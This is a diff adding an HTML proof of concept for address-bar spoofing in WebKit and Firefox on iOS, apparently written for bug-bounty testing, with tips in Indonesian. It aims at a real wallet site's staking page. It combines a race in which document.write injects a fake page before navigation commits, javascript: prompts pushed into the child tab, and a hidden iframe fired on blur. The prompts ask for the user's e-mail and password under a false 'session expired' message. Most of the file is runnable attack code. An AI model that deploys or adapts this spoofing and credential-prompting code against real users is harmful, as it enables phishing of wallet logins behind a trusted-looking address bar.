@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Address Bar Spoofing / WebKit Race PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 0; padding: 24px; }
+    .card { max-width: 720px; margin: 0 auto; padding: 24px; border: 1px solid #ddd; border-radius: 14px; }
+    h1 { margin: 0 0 12px 0; font-size: 20px; }
+    .row { display: grid; grid-template-columns: 1fr auto; gap: 10px; align-items: center; }
+    label { font-size: 14px; color: #555; }
+    input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 10px; }
+    button { padding: 10px 14px; border: 0; border-radius: 10px; cursor: pointer; }
+    .primary { background: #111; color: #fff; }
+    .muted { background: #f3f3f3; }
+    iframe { display: none; }
+    .tip { font-size: 12px; color: #666; margin-top: 8px; }
+    .log { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 12px; margin-top: 12px; white-space: pre-wrap; color: #444; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Address Bar Spoofing / WebKit & Firefox-iOS Behavior Test</h1>
+
+    <div class="row" style="margin-top:12px;">
+      <label for="target">Target URL (tab address):</label>
+      <input id="target" type="text" value="https://core.app/stake" />
+    </div>
+
+    <div class="row" style="margin-top:10px;">
+      <label for="delay">Race delay (ms) (write before nav):</label>
+      <input id="delay" type="text" value="40" />
+    </div>
+
+    <div class="row" style="margin-top:10px;">
+      <label for="promptText">Prompt text (for javascript: payload):</label>
+      <input id="promptText" type="text" value="Your session expired. Please re-enter your e-mail and your password:" />
+    </div>
+
+    <div class="row" style="margin-top:14px;">
+      <button class="primary" onclick="spoof()">Open & Attempt Spoof</button>
+      <button class="muted" onclick="resetLog()">Clear Log</button>
+    </div>
+
+    <p class="tip">
+      Tips: Tekan tombol, lalu SEGERA pindah fokus ke tab baru (atau app switch) untuk memicu <code>blur</code>.
+      PoC ini mencoba: (1) menulis HTML ke <code>about:blank</code> sebelum target memuat (race),
+      (2) set <code>javascript:</code> via <code>onblur</code> untuk prompt.
+    </p>
+
+    <pre class="log" id="log"></pre>
+  </div>
+
+  <!-- Hidden iframe for onblur javascript: prompt technique -->
+  <iframe id="x"></iframe>
+
+  <script>
+    const logEl = document.getElementById('log');
+    function log(...a){ logEl.textContent += a.join(' ') + '\n'; }
+
+    function resetLog(){ logEl.textContent=''; }
+
+    // Build spoofed page that looks unrelated to the actual address bar host
+    function makeSpoofHTML() {
+      return `
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Not Core Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;margin:0;padding:24px;background:#fff;}
+    .wrap{max-width:520px;margin:0 auto;border:1px solid #eee;padding:24px;border-radius:14px;}
+    h2{margin:0 0 8px 0}
+    p{color:#555;line-height:1.5}
+    button{margin-top:14px;padding:10px 14px;border:0;border-radius:10px;background:#111;color:#fff;cursor:pointer}
+    small{color:#999}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <h2>This is <i>not</i> Core Wallet!</h2>
+    <p>This content was written into the new tab <b>before</b> the real page finished loading (race condition test).</p>
+    <button onclick="
+      let username = prompt('Enter your username');
+      let password = prompt('Enter your password');
+      alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+    ">Fake Action</button>
+    <p><small>PoC-only demo for bug bounty testing.</small></p>
+  </div>
+</body>
+</html>`;
+    }
+
+    // Try several avenues:
+    // 1) document.write into about:blank (race window.open -> write)
+    // 2) as a fallback, attempt win.location = 'javascript:...' (blocked on most, but useful to test engines)
+    // 3) on window blur, trigger hidden iframe javascript:prompt (Firefox iOS-esque behavior test)
+    function spoof(){
+      resetLog();
+      const target = document.getElementById('target').value.trim() || 'https://core.app/stake';
+      const raceDelay = Math.max(0, parseInt(document.getElementById('delay').value.trim() || '0', 10));
+      const promptText = document.getElementById('promptText').value;
+
+      log('[*] Opening tab to:', target);
+      let child = window.open(target, '_blank');
+      if(!child){ log('[!] window.open blocked by popup blocker. Allow popups for this page.'); return; }
+
+      // 1) RACE: repeatedly try to write into about:blank quickly
+      let wrote = false;
+      const payload = makeSpoofHTML();
+
+      const start = performance.now();
+      const raceTimer = setInterval(() => {
+        try {
+          // Access allowed only while it's still about:blank (same-origin as opener)
+          child.document.open();
+          child.document.write(payload);
+          child.document.close();
+          wrote = true;
+          clearInterval(raceTimer);
+          log(`[+] document.write succeeded at t=${Math.round(performance.now()-start)}ms (likely before cross-origin nav).`);
+        } catch(e) {
+          // Throws once navigation to cross-origin actually starts/locks
+          clearInterval(raceTimer);
+          log('[-] document.write blocked (navigation likely committed to cross-origin).');
+        }
+      }, raceDelay);
+
+      // Stop race after ~1s just in case
+      setTimeout(()=>{ clearInterval(raceTimer); }, 1000);
+
+      // 2) Fallback attempt: drive javascript: in the child location (commonly blocked; interesting on some engines)
+      setTimeout(() => {
+        const jsPrompt = `javascript:prompt(${JSON.stringify(promptText)}, 'E-mail / Password.')`;
+        try {
+          child.location = jsPrompt;
+          log('[*] Attempted child.location=javascript:...');
+        } catch(e) {
+          log('[-] child.location=javascript: blocked:', e.message || e);
+        }
+      }, 300);
+
+      // 3) When this window loses focus (user switches to the new tab/app), try the classic onblur trick
+      const onBlur = () => {
+        window.removeEventListener('blur', onBlur, true);
+
+        // Hidden iframe javascript: prompt (tests Firefox iOS/WebKit oddities)
+        try {
+          const fx = document.getElementById('x');
+          fx.src = `javascript:prompt(${JSON.stringify(promptText)}, 'E-mail / Password.')`;
+          log('[*] onblur: set hidden iframe src=javascript:prompt(...)');
+        } catch(e){
+          log('[-] onblur iframe javascript: blocked:', e.message || e);
+        }
+
+        // Also try to nudge the child to javascript: on blur (some engines used to allow this)
+        try {
+          const jsPrompt = `javascript:prompt(${JSON.stringify(promptText)}, 'E-mail / Password.')`;
+          child.location = jsPrompt;
+          log('[*] onblur: attempted child.location=javascript:...');
+        } catch(e){
+          log('[-] onblur child.location=javascript: blocked:', e.message || e);
+        }
+      };
+      window.addEventListener('blur', onBlur, true);
+
+      log('[i] Now SWITCH to the new tab/app to trigger onblur…');
+    }
+
+    // Also allow quick testing by pressing Enter in inputs
+    ['target','delay','promptText'].forEach(id=>{
+      document.getElementById(id).addEventListener('keydown', e=>{
+        if(e.key==='Enter'){ spoof(); }
+      });
+    });
+  </script>
+</body>
+</html>
